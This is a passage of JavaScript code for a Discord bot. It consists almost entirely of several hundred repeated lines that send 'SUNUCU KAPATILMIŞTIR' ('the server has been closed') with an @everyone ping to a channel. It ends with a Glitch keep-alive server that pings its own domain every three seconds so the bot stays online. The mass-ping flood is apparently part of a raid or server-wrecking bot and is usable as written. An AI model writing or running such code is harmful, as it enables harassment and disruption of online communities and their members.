        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 

       
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);



